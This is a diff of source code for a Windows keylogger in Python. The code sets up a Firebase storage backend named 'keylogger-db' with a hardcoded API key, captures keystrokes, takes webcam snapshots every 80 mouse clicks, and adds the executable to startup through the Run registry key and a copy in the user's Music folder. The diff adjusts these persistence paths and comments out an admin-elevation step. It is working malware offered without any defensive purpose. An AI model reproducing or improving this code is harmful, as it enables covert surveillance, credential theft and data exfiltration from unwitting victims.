@@ -19,36 +19,38 @@ def is_admin():
         return False
 
 
-if not is_admin():
-    # Re-run the program with admin rights
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-    os._exit(1)
+try:
+    # if not is_admin():
+        # Re-run the program with admin rights
+        # ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        # os._exit(1)
 
+    config = {
+        'apiKey': "AIzaSyBb3RZaXNh1jZYx_qwW_L6sKOxDzi7pMdA",
+        'authDomain': "keylogger-db.firebaseapp.com",
+        'databaseURL': "https://keylogger-db.firebaseio.com",
+        'projectId': "keylogger-db",
+        'storageBucket': "keylogger-db.appspot.com",
+        'messagingSenderId': "282476825704",
+        'appId': "1:282476825704:web:b9d206ed7519da3b7d3fdd",
+        'measurementId': "G-TXMELPQRDB"
+    }
+    firebase = pyrebase.initialize_app(config)
+    storage = firebase.storage()
 
-config = {
-    'apiKey': "AIzaSyBb3RZaXNh1jZYx_qwW_L6sKOxDzi7pMdA",
-    'authDomain': "keylogger-db.firebaseapp.com",
-    'databaseURL': "https://keylogger-db.firebaseio.com",
-    'projectId': "keylogger-db",
-    'storageBucket': "keylogger-db.appspot.com",
-    'messagingSenderId': "282476825704",
-    'appId': "1:282476825704:web:b9d206ed7519da3b7d3fdd",
-    'measurementId': "G-TXMELPQRDB"
-}
-firebase = pyrebase.initialize_app(config)
-storage = firebase.storage()
+    full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
+    today_date = full_currentTime.split(' ')[1]
 
-full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
-today_date = full_currentTime.split(' ')[1]
+    f = open('data.txt', 'w', encoding='utf-8')
 
-f = open('data.txt', 'w', encoding='utf-8')
-
-data = ''
-lastThreeKeys = []
-countDelete = 0
-clicks_counter = 0
-imgPath = 'screenshot.jpg'
-pcName = os.environ['COMPUTERNAME']
+    data = ''
+    lastThreeKeys = []
+    countDelete = 0
+    clicks_counter = 0
+    imgPath = 'screenshot.jpg'
+    pcName = os.environ['COMPUTERNAME']
+except Exception as e:
+    print(e)
 
 
 def on_press(key):
@@ -143,8 +145,8 @@ def on_click(x, y, button, pressed):
         except Exception as e:
             print(e)
 
-    elif clicks_counter==80:
-        clicks_counter=0
+    elif clicks_counter == 80:
+        clicks_counter = 0
         try:
             vc = cv2.VideoCapture(0)
             if vc.isOpened():  # try to get the first frame
@@ -171,13 +173,13 @@ def addToStartup():
     try:
         USER_NAME = getpass.getuser()
         src = str(os.getcwd()) + '\\keylogger.exe'
-        dst = r'C:\Users\%s\AppData' % USER_NAME
+        dst = r'C:\Users\%s\Music' % USER_NAME
         shutil.copy2(src, dst)
 
-        dst = r'C:\WINDOWS\system32'
-        shutil.copy2(src, dst)
+        # dst = r'C:\WINDOWS\system32'
+        # shutil.copy2(src, dst)
 
-        exePath = 'C:\\Users\\%s\\AppData\\keylogger.exe' % USER_NAME  # name of script after making EXE
+        exePath = 'C:\\Users\\%s\\Music\\keylogger.exe' % USER_NAME  # name of script after making EXE
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                              r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
                              winreg.KEY_SET_VALUE)
